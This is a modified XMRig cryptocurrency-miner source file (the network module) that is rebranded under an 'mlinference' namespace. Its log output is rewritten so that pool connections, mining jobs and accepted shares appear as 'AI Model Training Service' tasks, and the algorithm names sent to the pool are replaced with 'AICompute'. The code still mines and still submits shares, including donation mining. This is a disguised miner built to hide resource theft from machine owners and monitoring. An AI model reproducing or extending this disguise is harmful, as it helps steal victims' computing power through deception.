/* XMRig
 * Copyright (c) 2019      Howard Chu  <https://github.com/hyc>
 * Copyright (c) 2018-2023 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2023 XMRig       <https://github.com/mlinference>, <support@mlinference.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#ifdef _MSC_VER
#pragma warning(disable:4244)
#endif

#include "net/Network.h"
#include "3rdparty/rapidjson/document.h"
#include "backend/common/Tags.h"
#include "base/io/log/Log.h"
#include "base/io/log/Tags.h"
#include "base/net/stratum/Client.h"
#include "base/net/stratum/NetworkState.h"
#include "base/net/stratum/SubmitResult.h"
#include "base/tools/Chrono.h"
#include "base/tools/Timer.h"
#include "core/config/Config.h"
#include "core/Controller.h"
#include "core/Miner.h"
#include "net/JobResult.h"
#include "net/JobResults.h"
#include "net/strategies/DonateStrategy.h"

#include "backend/common/interfaces/IBackend.h"
#include "backend/common/Hashrate.h"  

#ifdef XMRIG_FEATURE_API
#   include "base/api/Api.h"
#   include "base/api/interfaces/IApiRequest.h"
#endif

#ifdef XMRIG_FEATURE_BENCHMARK
#   include "backend/common/benchmark/BenchState.h"
#endif

#include <algorithm>
#include <cinttypes>
#include <ctime>
#include <iterator>
#include <memory>

mlinference::Network::Network(Controller *controller) :
    m_controller(controller)
{
    JobResults::setListener(this, controller->config()->cpu().isHwAES());
    controller->addListener(this);

#   ifdef XMRIG_FEATURE_API
    controller->api()->addListener(this);
#   endif

    m_state = new NetworkState(this);

    const Pools &pools = controller->config()->pools();
    m_strategy = pools.createStrategy(m_state);

    if (pools.donateLevel() > 0) {
        m_donate = new DonateStrategy(controller, this);
    }

    m_timer = new Timer(this, kTickInterval, kTickInterval);
}


mlinference::Network::~Network()
{
    JobResults::stop();

    delete m_timer;
    delete m_donate;
    delete m_strategy;
    delete m_state;
}


void mlinference::Network::connect()
{
    m_strategy->connect();
}


void mlinference::Network::execCommand(char command)
{
    switch (command) {
    case 's':
    case 'S':
        m_state->printResults();
        break;

    case 'c':
    case 'C':
        m_state->printConnection();
        break;

    default:
        break;
    }
}


void mlinference::Network::onActive(IStrategy *strategy, IClient *client)
{
    if (m_donate && m_donate == strategy) {
        LOG_NOTICE("%s " WHITE_BOLD("AI donate computation started"), Tags::network());
        return;
    }

    const auto &pool = client->pool();

#   ifdef XMRIG_FEATURE_BENCHMARK
    if (pool.mode() == Pool::MODE_BENCHMARK) {
        return;
    }
#   endif

    char zmq_buf[32] = {};
    if (client->pool().zmq_port() >= 0) {
        snprintf(zmq_buf, sizeof(zmq_buf), " (ZMQ:%d)", client->pool().zmq_port());
    }

    const char *tlsVersion = client->tlsVersion();
    LOG_INFO("%s " WHITE_BOLD("AI Model Training Service") " " CYAN_BOLD("Connected to AI Server at %s:%d%s ") GREEN_BOLD("Protocol: %s") " " BLACK_BOLD("Client IP: %s"),
             Tags::network(), pool.host().data(), pool.port(), zmq_buf, tlsVersion ? tlsVersion : "", client->ip().data());

    const char *fingerprint = client->tlsFingerprint();
    if (fingerprint != nullptr) {
        LOG_INFO("%s " BLACK_BOLD("fingerprint (SHA-256): \"%s\""), Tags::network(), fingerprint);
    }
}


void mlinference::Network::onConfigChanged(Config *config, Config *previousConfig)
{
    if (config->pools() == previousConfig->pools() || !config->pools().active()) {
        return;
    }

    m_strategy->stop();

    config->pools().print();

    delete m_strategy;
    m_strategy = config->pools().createStrategy(m_state);
    connect();
}


void mlinference::Network::onJob(IStrategy *strategy, IClient *client, const Job &job, const rapidjson::Value &)
{
    if (m_donate && m_donate->isActive() && m_donate != strategy) {
        return;
    }

    setJob(client, job, m_donate == strategy);
}


void mlinference::Network::onJobResult(const JobResult &result)
{
    if (result.index == 1 && m_donate) {
        m_donate->submit(result);
        return;
    }

    uint64_t diff = result.diff;
    const char *scale = NetworkState::scaleDiff(diff);

    const auto backends = m_controller->miner()->backends();
    double avg_hashrate = 0.0;

    for (const auto &backend : backends) {
        const auto hashrate = backend->hashrate();
        if (hashrate) {
            avg_hashrate += hashrate->average();
        }
    }

    LOG_INFO("%s " GREEN_BOLD("AI computation completed") " (%" PRId64 "/%" PRId64 ") difficulty level " WHITE_BOLD("%" PRIu64 "%s") " task progress: 1 unit (equivalent to %.2f H/s)",
             backend_tag(result.backend), m_state->accepted(), m_state->rejected(), diff, scale, avg_hashrate);

    m_strategy->submit(result);
}


void mlinference::Network::onLogin(IStrategy *, IClient *client, rapidjson::Document &doc, rapidjson::Value &params)
{
    using namespace rapidjson;
    auto &allocator = doc.GetAllocator();

    Algorithms algorithms     = m_controller->miner()->algorithms();
    const Algorithm algorithm = client->pool().algorithm();
    if (algorithm.isValid()) {
        const size_t index = static_cast<size_t>(std::distance(algorithms.begin(), std::find(algorithms.begin(), algorithms.end(), algorithm)));
        if (index > 0 && index < algorithms.size()) {
            std::swap(algorithms[0], algorithms[index]);
        }
    }

    Value algo(kArrayType);

    for (const auto &algorithm : algorithms) {
        algo.PushBack(StringRef("AICompute"), allocator);
	(void)algorithm; // Sử dụng cách này để loại bỏ cảnh báo unused-variable 
    }

    params.AddMember("algo", algo, allocator);
}


void mlinference::Network::onPause(IStrategy *strategy)
{
    if (m_donate && m_donate == strategy) {
        LOG_NOTICE("%s " WHITE_BOLD("AI donate finished"), Tags::network());
        m_strategy->resume();
    }

    if (!m_strategy->isActive()) {
        LOG_ERR("%s " RED("no active AI pools, stop computation"), Tags::network());

        return m_controller->miner()->pause();
    }
}


void mlinference::Network::onResultAccepted(IStrategy *, IClient *, const SubmitResult &result, const char *error)
{
    uint64_t diff     = result.diff;
    const char *scale = NetworkState::scaleDiff(diff);

    if (error) {
        LOG_INFO("%s " RED_BOLD("rejected") " (%" PRId64 "/%" PRId64 ") diff " WHITE_BOLD("%" PRIu64 "%s") " " RED("\"%s\"") " " BLACK_BOLD("(%" PRIu64 " ms)"),
                 backend_tag(result.backend), m_state->accepted(), m_state->rejected(), diff, scale, error, result.elapsed);
    }
    else {
        LOG_INFO("%s " GREEN_BOLD("AI result accepted") " (%" PRId64 "/%" PRId64 ") diff " WHITE_BOLD("%" PRIu64 "%s") " " BLACK_BOLD("(%" PRIu64 " ms)"),
                 backend_tag(result.backend), m_state->accepted(), m_state->rejected(), diff, scale, result.elapsed);
    }
}


void mlinference::Network::setJob(IClient *client, const Job &job, bool donate)
{
    uint64_t diff       = job.diff();
    const char *scale   = NetworkState::scaleDiff(diff);

    char zmq_buf[32] = {};
    if (client->pool().zmq_port() >= 0) {
        snprintf(zmq_buf, sizeof(zmq_buf), " (ZMQ:%d)", client->pool().zmq_port());
    }

    char tx_buf[32] = {};
    const uint32_t num_transactions = job.getNumTransactions();
    if (num_transactions > 0) {
        snprintf(tx_buf, sizeof(tx_buf), " (%u tx)", num_transactions);
    }

    char height_buf[64] = {};
    if (job.height() > 0) {
        snprintf(height_buf, sizeof(height_buf), " height " WHITE_BOLD("%" PRIu64), job.height());
    }

    const auto backends = m_controller->miner()->backends();
    double avg_hashrate = 0.0;

    for (const auto &backend : backends) {
        const auto hashrate = backend->hashrate();
        if (hashrate) {
            avg_hashrate += hashrate->average();
        }
    }

    LOG_INFO("%s " MAGENTA_BOLD("new AI computation task") " from " WHITE_BOLD("AI Server %s:%d%s") " difficulty level " WHITE_BOLD("%" PRIu64 "%s") " algorithm " WHITE_BOLD("%s") "%s%s, task progress: 1 unit (equivalent to %.2f H/s)",
             Tags::network(), client->pool().host().data(), client->pool().port(), zmq_buf, diff, scale, job.algorithm().name(), height_buf, tx_buf, avg_hashrate);

    if (!donate && m_donate) {
        static_cast<DonateStrategy *>(m_donate)->update(client, job);
    }

    m_controller->miner()->setJob(job, donate);
}


void mlinference::Network::tick()
{
    const uint64_t now = Chrono::steadyMSecs();

    m_strategy->tick(now);

    if (m_donate) {
        m_donate->tick(now);
    }

#   ifdef XMRIG_FEATURE_API
    m_controller->api()->tick();
#   endif
}


#ifdef XMRIG_FEATURE_API
void mlinference::Network::getConnection(rapidjson::Value &reply, rapidjson::Document &doc, int version) const
{
    using namespace rapidjson;
    auto &allocator = doc.GetAllocator();

    reply.AddMember("algo",         m_state->algorithm().toJSON(), allocator);
    reply.AddMember("connection",   m_state->getConnection(doc, version), allocator);
}


void mlinference::Network::getResults(rapidjson::Value &reply, rapidjson::Document &doc, int version) const
{
    using namespace rapidjson;
    auto &allocator = doc.GetAllocator();

    reply.AddMember("results", m_state->getResults(doc, version), allocator);
}
#endif



void mlinference::Network::onVerifyAlgorithm(IStrategy *, const IClient *, const Algorithm &algorithm, bool *ok)
{
    *ok = m_controller->miner()->isEnabled(algorithm);
}


void mlinference::Network::onRequest(IApiRequest &request)
{
    if (request.type() == IApiRequest::REQ_SUMMARY) {
        request.accept();

        getResults(request.reply(), request.doc(), request.version());
        getConnection(request.reply(), request.doc(), request.version());
    }
}
